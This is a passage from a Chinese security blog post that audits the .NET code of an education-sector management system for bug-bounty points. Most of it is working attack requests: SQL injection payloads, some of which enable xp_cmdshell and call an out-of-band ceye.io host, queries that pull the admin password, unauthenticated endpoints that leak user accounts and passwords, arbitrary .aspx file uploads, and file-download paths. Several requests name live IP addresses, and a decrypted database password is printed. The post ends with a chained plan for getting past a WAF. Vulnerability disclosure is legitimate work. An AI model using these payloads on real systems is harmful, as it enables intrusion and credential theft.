<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> top <span class="number">10</span> <span class="operator">*</span> <span class="keyword">FROM</span> [honghua2703].dbo.[Sys_Account]</span><br></pre></td></tr></table></figure>

<p>对该密文解密脚本就是我之前给出的</p>
<p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/221381/30/36113/121708/64fdba1fF3d79ad41/53a7a67516e0d09c.jpg" alt="image.png"></p>
<p>解密得到honghua22083865，这个公共数据库的作用就是当某单位没有自己搭建mssql数据库时，或者mssql数据库出错时可以利用的。</p>
<h4 id="SQL前台开启xp-cmdshell-gt-RCE"><a href="#SQL前台开启xp-cmdshell-gt-RCE" class="headerlink" title="SQL前台开启xp_cmdshell -&gt; RCE"></a>SQL前台开启xp_cmdshell -&gt; RCE</h4><p>我们刚才审到了那个任意方法调用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://110.52.114.163:8018/Handlers/Api.ashx?act=GetArticleList&amp;TypeName=1&#x27;;execute(&#x27;xp_cmdshell &quot;ping fl8nw3.ceye.io&quot;&#x27;)--</span><br></pre></td></tr></table></figure>



<p>替换如下</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;RECONFIGURE;</span><br><span class="line">sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>;RECONFIGURE;</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;whoami&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>这里之所以用这种而不用</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">execute</span>(<span class="string">&#x27;xp_cmdshell &quot;whoami&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>原因是因为你执行whoami时单引号和双引号都用上了，而前者还可以使用双引号，执行一些命令时不至于引号冲突。</p>
<h4 id="任意方法调用获取当前数据库配置信息"><a href="#任意方法调用获取当前数据库配置信息" class="headerlink" title="任意方法调用获取当前数据库配置信息"></a>任意方法调用获取当前数据库配置信息</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.izhihuiguadmin.com/Handlers/api.ashx?act=Comm.AdminDo&amp;sign=23091020&amp;cmd=conn</span><br></pre></td></tr></table></figure>

<p><img src="https://img10.360buyimg.com/ddimg/jfs/t1/124785/38/35095/24652/64fdbb6eF67f36707/b957949158365cad.jpg" alt="image.png"></p>
<p>这里的23091020是当前的年月日时，如果错误会提示：</p>
<p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/178020/38/38027/16585/64fdbb86F652225ce/1a989d91f3608377.jpg" alt="image.png"></p>
<p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/91202/22/32012/91641/64f0031eF48f0d4e3/74a27ef28de18f6c.jpg" alt="image.png"></p>
<p>那么这个有什么用呢？</p>
<p>前面我们已经有前台SQL注入了，我们为何不直接前台查询管理员密码呢？</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/SDKApi/CustomerService</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>191</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-sas"><span class="keyword">fileName</span>=123<span class="variable">&amp;isRead</span>=<span class="string">&#x27;-(select convert(int,(select AccountPwd FROM [hanlinhighschool].dbo.[Sys_Account] WHERE AccountNum = &#x27;</span>admin<span class="string">&#x27;)) FROM syscolumns)-&#x27;</span><span class="variable">&amp;classInfo</span>=123<span class="variable">&amp;from</span>=123<span class="variable">&amp;to</span>=123<span class="variable">&amp;TypeID</span>=123</span></span><br></pre></td></tr></table></figure>

<p>这里的hanlinhighschool就是数据库，由上一个的直接替换过来，那不写行不行呢？</p>
<p>我们直接</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fileName<span class="operator">=</span><span class="number">123</span><span class="operator">&amp;</span>isRead<span class="operator">=</span><span class="string">&#x27;-(select convert(int,(select AccountPwd FROM [Sys_Account] WHERE AccountNum = &#x27;</span>admin<span class="string">&#x27;)) FROM syscolumns)-&#x27;</span><span class="operator">&amp;</span>classInfo<span class="operator">=</span><span class="number">123</span><span class="operator">&amp;</span><span class="keyword">from</span><span class="operator">=</span><span class="number">123</span><span class="operator">&amp;</span><span class="keyword">to</span><span class="operator">=</span><span class="number">123</span><span class="operator">&amp;</span>TypeID<span class="operator">=</span><span class="number">123</span></span><br></pre></td></tr></table></figure>

<p>不行吗？其实也行，因为是默认数据库</p>
<h4 id="任意方法调用导致用户账号泄露-默认密码"><a href="#任意方法调用导致用户账号泄露-默认密码" class="headerlink" title="任意方法调用导致用户账号泄露-默认密码"></a>任意方法调用导致用户账号泄露-默认密码</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.76.250.171:8001/Handlers/api.ashx?act=Comm.GetUserList</span><br></pre></td></tr></table></figure>

<p>得到的UserNum即是账号也是密码</p>
<p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/166379/26/38490/308503/64fdbca4Ff4b4df7a/3df64ba80cfdc7a1.jpg" alt="image.png"></p>
<h4 id="后台未授权-1（身份证）"><a href="#后台未授权-1（身份证）" class="headerlink" title="后台未授权 * 1（身份证）"></a>后台未授权 * 1（身份证）</h4><p>该条件是需要登陆的Cookie，该Cookie过程我看了，难以伪造，</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/HRM/Sys_UserInfo/GetFormJson?keyValue=21</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>xxx</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里的keyValue是数据库里的Sys_AccountID<img src="https://img12.360buyimg.com/ddimg/jfs/t1/156712/19/39918/42643/64fdbd24Fe71b8b61/1a0b7dbd5760895c.jpg" alt="image.png"></p>
<p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/177932/20/36608/183672/64f03e44Fd67e7c42/d1560deb03f7272b.jpg" alt="image.png"></p>
<h4 id="后台未授权-2（密码）"><a href="#后台未授权-2（密码）" class="headerlink" title="后台未授权 * 2（密码）"></a>后台未授权 * 2（密码）</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/HRM/Sys_Account/GetFormJson?keyValue=857</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>xxx</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>keyValue同上面</p>
<p><img src="https://img10.360buyimg.com/ddimg/jfs/t1/150379/30/31136/155251/64fdbde0F5b93b730/733ab2d0b5443ecf.jpg" alt="image.png"></p>
<h4 id="任意文件下载-10处"><a href="#任意文件下载-10处" class="headerlink" title="任意文件下载 * 10处"></a>任意文件下载 * 10处</h4><p>这里我们过去都是下载C:\Windows\win.ini，但是如果C:\Windows\win.ini是高权限才能看，但是你通过web是低权限访问不了怎么办呢？</p>
<p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/204157/25/32848/64376/64fdbe8dF04735148/7d6cc58de5537a36.jpg" alt="image.png"></p>
<p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/223102/34/36496/76297/64fdbfa5Fb1f900e7/a73661cc9748e38e.jpg" alt="image.png"></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/Documents/desktop.ini</span><br><span class="line">或者</span><br><span class="line">C:/Users/Public/desktop.ini</span><br></pre></td></tr></table></figure>

<p>NT SERVICE的权限足够读取这个文件了</p>
<p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/186769/16/37451/121053/64fdbfbbFc282b08c/83d9d968fdc47148.jpg" alt="image.png"></p>
<p>.</p>
<h4 id="组合拳"><a href="#组合拳" class="headerlink" title="组合拳"></a>组合拳</h4><p>那么这套系统如何组合拳打进入后台以便于交更多的洞呢？</p>
<p>方案一：前台SQL查管理员密码（该方法如果对方有WAF则无）</p>
<p>方案二：前台查任意用户账号，用默认密码登陆进去后利用越权，得到管理员密码（该方案可能会受制于某些系统禁止普通用户权限登陆该系统，因为这些普通用户平时是通过刷卡的方式进去的）</p>
<p>方案三：利用第二套系统的某个前台特殊注入，可以自定义查询的表，列，字段查管理员密码，如下</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/WebService/EquipService.asmx/CheckIsExits</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-dts">tableN<span class="attr">ame</span><span class="operator">=</span>[Sys_Account]<span class="variable">&amp;</span>fieldN<span class="attr">ame</span><span class="operator">=</span>AccountNum<span class="variable">&amp;value</span>=admin<span class="variable">&amp;</span>fixC<span class="attr">on</span><span class="operator">=</span></span></span><br></pre></td></tr></table></figure>

<p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/71732/40/23712/127794/64fdc232F812f1d66/a9b62aeff391e15e.jpg" alt="image.png"></p>
<p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/104006/8/43433/47652/64fdc3d8F753a7b2a/037a3590184a78df.jpg" alt="image.png"></p>
<p>方案是最稳妥了，因为此种方式WAF无法拦截</p>
<p>1200分（第二套的很多洞已经不让交了，很多高危被当成中危处理了）</p>
<p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/183451/39/38155/31859/65093769F89e01ebf/40bebd3d22ff4f17.jpg" alt="image.png"></p>
<h3 id="第二套"><a href="#第二套" class="headerlink" title="第二套"></a>第二套</h3><p>第一套SQL注入超过200处了，第二套SQL注入至少也100处了</p>
<p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/95840/17/43488/17113/64fdc48aF82586333/c5d32b6a816cac56.jpg" alt="image.png"></p>
<p>1）任意文件写入</p>
<p>POST /ashx/BinaryFileUploadHandler.ashx HTTP/1.1<br>Host: localhost<br>User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Content-Type: multipart/form-data; boundary=—————————76296292937377940201553378012<br>Content-Length: 7222<br>fileName: example.aspx<br>Origin: null<br>Connection: close<br>Upgrade-Insecure-Requests: 1</p>
<p>123</p>
<p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/195945/31/36456/97549/64fc5b06F00ea08d3/893806a933fa76e5.jpg" alt="image.png"></p>
<p>很直接，没什么好说的，</p>
<p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/109960/32/44927/54720/64fdc4d1F2158b952/394499d2af06c1d6.jpg" alt="image.png"></p>
<p>2）</p>
<p>POST /ashx/FileHandler.ashx?dir=images&amp;filestrExt=.aspx&amp;filename=123456789 HTTP/1.1<br>Host: localhost<br>User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Content-Type: multipart/form-data; boundary=—————————26184285723647904033913129367<br>Content-Length: 3<br>Origin: null<br>Connection: close<br>Upgrade-Insecure-Requests: 1</p>
<p>123</p>
<p><img src="https://img10.360buyimg.com/ddimg/jfs/t1/223244/24/25966/107609/64fc5c7eF6210b82f/385a0631d62d0869.jpg" alt="image.png"></p>
<p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/101519/31/44682/66886/64fdc518Fcbe03e19/03cde6ef0634da4e.jpg" alt="image.png"></p>
<p>也没什么好说的</p>
<p>之后若干洞不让交了</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%A5%97"><span class="toc-number">1.</span> <span class="toc-text">第一套</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%87%E5%85%A5%E7%82%B9"><span class="toc-number">1.1.</span> <span class="toc-text">切入点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%B1%E6%BA%90%E7%A0%81"><span class="toc-number">1.2.</span> <span class="toc-text">脱源码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%BE%E5%88%B0%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%89%80%E5%9C%A8%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.3.</span> <span class="toc-text">找到账号密码所在的数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8-SQL%E6%B3%A8%E5%85%A5-1%EF%BC%88%E5%B1%95%E7%A4%BA%E9%83%A8%E5%88%86%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">前台任意方法调用-SQL注入 * 1（展示部分）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8-SQL%E6%B3%A8%E5%85%A5-2"><span class="toc-number">1.5.</span> <span class="toc-text">前台任意方法调用-SQL注入 * 2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">1.6.</span> <span class="toc-text">通用弱口令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E5%89%8D%E5%8F%B0%E5%BC%80%E5%90%AFxp-cmdshell-gt-RCE"><span class="toc-number">1.7.</span> <span class="toc-text">SQL前台开启xp_cmdshell -&gt; RCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF"><span class="toc-number">1.8.</span> <span class="toc-text">任意方法调用获取当前数据库配置信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%E5%AF%BC%E8%87%B4%E7%94%A8%E6%88%B7%E8%B4%A6%E5%8F%B7%E6%B3%84%E9%9C%B2-%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81"><span class="toc-number">1.9.</span> <span class="toc-text">任意方法调用导致用户账号泄露-默认密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E6%9C%AA%E6%8E%88%E6%9D%83-1%EF%BC%88%E8%BA%AB%E4%BB%BD%E8%AF%81%EF%BC%89"><span class="toc-number">1.10.</span> <span class="toc-text">后台未授权 * 1（身份证）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E6%9C%AA%E6%8E%88%E6%9D%83-2%EF%BC%88%E5%AF%86%E7%A0%81%EF%BC%89"><span class="toc-number">1.11.</span> <span class="toc-text">后台未授权 * 2（密码）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-10%E5%A4%84"><span class="toc-number">1.12.</span> <span class="toc-text">任意文件下载 * 10处</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%84%E5%90%88%E6%8B%B3"><span class="toc-number">1.13.</span> <span class="toc-text">组合拳</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%A5%97"><span class="toc-number">2.</span> <span class="toc-text">第二套</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/08/29/edu%E4%B8%80%E5%A5%97%E4%B8%8A%E4%B8%80%E5%8D%83%E5%88%86%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(dotNet)/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/08/29/edu%E4%B8%80%E5%A5%97%E4%B8%8A%E4%B8%80%E5%8D%83%E5%88%86%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(dotNet)/&text=edu一套上一千分的系统代码审计(dotNet)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/08/29/edu%E4%B8%80%E5%A5%97%E4%B8%8A%E4%B8%80%E5%8D%83%E5%88%86%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(dotNet)/&title=edu一套上一千分的系统代码审计(dotNet)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/08/29/edu%E4%B8%80%E5%A5%97%E4%B8%8A%E4%B8%80%E5%8D%83%E5%88%86%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(dotNet)/&is_video=false&description=edu一套上一千分的系统代码审计(dotNet)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=edu一套上一千分的系统代码审计(dotNet)&body=Check out this article: http://example.com/2023/08/29/edu%E4%B8%80%E5%A5%97%E4%B8%8A%E4%B8%80%E5%8D%83%E5%88%86%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(dotNet)/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/08/29/edu%E4%B8%80%E5%A5%97%E4%B8%8A%E4%B8%80%E5%8D%83%E5%88%86%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(dotNet)/&title=edu一套上一千分的系统代码审计(dotNet)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/08/29/edu%E4%B8%80%E5%A5%97%E4%B8%8A%E4%B8%80%E5%8D%83%E5%88%86%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(dotNet)/&title=edu一套上一千分的系统代码审计(dotNet)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/08/29/edu%E4%B8%80%E5%A5%97%E4%B8%8A%E4%B8%80%E5%8D%83%E5%88%86%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(dotNet)/&title=edu一套上一千分的系统代码审计(dotNet)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/08/29/edu%E4%B8%80%E5%A5%97%E4%B8%8A%E4%B8%80%E5%8D%83%E5%88%86%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(dotNet)/&title=edu一套上一千分的系统代码审计(dotNet)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/08/29/edu%E4%B8%80%E5%A5%97%E4%B8%8A%E4%B8%80%E5%8D%83%E5%88%86%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(dotNet)/&name=edu一套上一千分的系统代码审计(dotNet)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/08/29/edu%E4%B8%80%E5%A5%97%E4%B8%8A%E4%B8%80%E5%8D%83%E5%88%86%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(dotNet)/&t=edu一套上一千分的系统代码审计(dotNet)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2021-2024
    塔菲
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
